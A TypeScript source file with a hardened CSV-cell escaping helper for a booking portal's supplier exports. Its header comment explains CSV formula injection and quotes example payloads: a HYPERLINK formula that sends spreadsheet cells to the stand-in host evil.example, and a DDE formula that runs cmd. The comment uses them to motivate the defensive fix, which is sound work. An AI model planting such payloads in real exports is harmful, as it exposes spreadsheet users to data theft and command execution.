/**
 * Phase 591: shared, hardened CSV-cell escaping for every supplier CSV
 * export (Bookings, Pickup Planner, Earnings).
 *
 * The gap. Three supplier-portal export functions (downloadBookingsCsv in
 * SupplierBookings.tsx, exportCsv in SupplierPickupPlanner.tsx, and the
 * money export in SupplierEarnings.tsx) each hand-rolled their own local
 * `escape`/`csvEscape` helper. All three only guarded against ordinary CSV
 * syntax characters (a literal quote, comma, or newline) -- none of them
 * defended against CSV/formula injection (CWE-1236, OWASP's "CSV
 * Injection"). Every one of these exports includes at least one field a
 * TRAVELER controls directly at checkout with no format restriction --
 * guest_name in all three, plus special_requests and cancellation_reason
 * in Bookings/Pickup Planner. A traveler who sets their guest name (or a
 * special request) to something like `=HYPERLINK("https://evil.example/
 * steal?d="&A1&A2,"Open")` or an older-Excel DDE payload
 * (`=cmd|'/c calc'!A1`) gets that value written verbatim into the CSV a
 * SUPPLIER later exports and opens in Excel/Google Sheets/LibreOffice --
 * and all three of those apps evaluate a cell starting with =, +, -, or @
 * as a formula by default, regardless of whether the raw CSV field was
 * quoted (quoting only affects CSV *parsing*, not the spreadsheet app's
 * post-parse decision to treat a cell's content as a formula). This is a
 * real attack surface: any traveler can reach it through an ordinary,
 * unauthenticated checkout, no booking approval or special access needed,
 * targeting the supplier who exports their own booking data.
 *
 * The fix. A single shared cell-escaping function, used by all three
 * exports (removing their duplicated local copies -- the "same guard
 * missing from every sibling call site" pattern this mission has fixed
 * before, just with a shared cause instead of one only missing it).
 * csvSafeCell() applies the standard OWASP CSV-injection mitigation:
 * when a cell's *first* character is one a spreadsheet app treats as a
 * formula/DDE trigger (=, +, -, @, or a leading tab/carriage-return,
 * which some parsers also treat as significant), prefix it with a single
 * quote. Every mainstream spreadsheet app (Excel, Google Sheets,
 * LibreOffice) renders a leading `'` as a "this cell is forced to text"
 * marker and does not display the quote itself or evaluate the rest of
 * the cell as a formula -- so a legitimate value that happens to start
 * with one of these characters (e.g. a special request of "-5C please
 * keep it cool") still displays correctly to the supplier, just
 * guaranteed to render as plain text rather than possibly evaluate.
 * Existing CSV syntax escaping (wrapping in quotes and doubling embedded
 * quotes when a cell contains a comma, quote, or newline) is preserved
 * unchanged -- this is a strict hardening, not a change to any exported
 * column, value, or business rule.
 */

const CSV_FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** True when a raw cell value's first character would make a spreadsheet app treat it as a formula/DDE trigger. */
export function isCsvFormulaTrigger(raw: string): boolean {
  return raw.length > 0 && CSV_FORMULA_TRIGGER_CHARS.has(raw[0]);
}

/**
 * Format one CSV cell for a supplier-facing export: neutralizes
 * formula/DDE injection (OWASP CSV Injection mitigation -- a leading
 * single quote forces spreadsheet apps to treat the cell as text), then
 * applies standard CSV syntax escaping (quote-wrap + double embedded
 * quotes) when the cell contains a comma, quote, or newline.
 */
export function csvSafeCell(value: unknown): string {
  let s = String(value ?? '');
  if (isCsvFormulaTrigger(s)) {
    s = `'${s}`;
  }
  if (s.includes('"') || s.includes(',') || s.includes('\n')) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
